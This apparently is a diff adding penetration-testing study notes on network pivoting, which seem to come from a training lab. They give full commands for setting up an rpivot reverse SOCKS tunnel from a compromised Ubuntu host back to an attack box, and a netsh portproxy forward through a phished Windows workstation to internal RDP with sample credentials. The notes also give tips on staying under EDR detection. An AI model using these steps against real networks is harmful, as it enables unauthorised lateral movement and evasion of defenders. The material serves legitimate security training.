@@ -1,0 +1,133 @@
+🧠 Rpivot Summary — "Got This? Do That" Style
+🔍 What It Is:
+rpivot = reverse SOCKS proxy written in Python2.
+
+Lets a machine inside the network (pivot) tunnel traffic back to you (attack box).
+
+You end up with a local SOCKS proxy (127.0.0.1:9050) that routes traffic through that internal pivot box.
+
+🧱 Scenario Recap:
+You pop an Ubuntu box inside a network.
+
+That box can reach 172.16.5.135:80 (internal web server), but you can’t.
+
+Instead of SSH tunneling or Meterpreter autoroute, you:
+
+Run server.py (your box) to open:
+
+Port 9999 for the client connection
+
+Port 9050 to listen for proxychains traffic
+
+Copy client.py to the target and run it — boom, now the proxy link is active.
+
+Use proxychains locally (with 127.0.0.1:9050) and access 172.16.5.135 like you're inside the network.
+
+💻 Command Cheat Sheet
+On Your Attack Box:
+
+bash
+Copy
+Edit
+git clone https://github.com/klsecservices/rpivot.git
+cd rpivot
+python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+Transfer to Target:
+
+bash
+Copy
+Edit
+scp -r rpivot ubuntu@<target>:~
+On Target (Ubuntu Pivot):
+
+bash
+Copy
+Edit
+cd rpivot
+python2.7 client.py --server-ip <your_attack_ip> --server-port 9999
+On Attack Box (after SOCKS is live):
+
+bash
+Copy
+Edit
+echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf
+proxychains firefox-esr http://172.16.5.135
+⚔️ Differences vs Other Tools:
+Tool	Works Over	Pros	Cons
+SSH SOCKS	SSH	Native, reliable	Needs open SSH
+Meterpreter + autoroute	Meterpreter shell	Easy route mgmt	Relies on MSF
+socat	TCP	Simple binary relay	Can’t SOCKS/proxy
+rpivot	Python TCP	Web access + proxyable	Python2 only, manual setup
+🔐 When to Use Rpivot IRL:
+No SSH access to pivot machine
+
+Want to access internal web apps from your browser
+
+You can’t use Meterpreter (E.g. caught by EDR or detection)
+
+You need SOCKS-like flexibility, but SSH and autoroute are off the table
+
+NetSH 
+
+🧠 "Got This? Do That" – Netsh Port Forwarding
+🔹 Scenario
+You land on a Windows workstation (e.g. via phishing)
+
+That box has access to an internal RDP server (172.16.5.25)
+
+Your attack host is outside in 10.129.x.x
+
+You want to connect to that RDP server from your box by pivoting through the compromised machine
+
+🧰 Netsh Port Forward Setup
+Netsh lets you create a v4tov4 portproxy that listens on a local port and forwards traffic to a remote IP:port.
+
+✅ Command
+powershell
+Copy
+Edit
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25
+listenaddress: Your pivot box's IP that you can reach from outside
+
+listenport: Port you will connect to
+
+connectaddress: Internal system you want to reach
+
+connectport: Internal service port (RDP = 3389)
+
+🔍 Check It's Working
+powershell
+Copy
+Edit
+netsh interface portproxy show v4tov4
+You should see:
+
+nginx
+Copy
+Edit
+Address         Port        Address         Port
+10.129.42.198   8080        172.16.5.25     3389
+🚀 Connect From Your Box
+On your attacker machine:
+
+bash
+Copy
+Edit
+xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
+🎯 Boom — you're pivoting through a Windows box without any tools at all.
+
+🧼 Cleanup
+Remove the port forward when done:
+
+powershell
+Copy
+Edit
+netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=10.129.42.198
+🔑 When Would I Use This?
+Situation	Use Netsh Port Forward?
+Windows box with no tools?	✅ Yes
+Can’t upload or run Meterpreter/SSH/Socat?	✅ Yes
+Need to access RDP/internal service fast?	✅ Yes
+Trying to stay under EDR’s radar?	✅ Yes
+
+
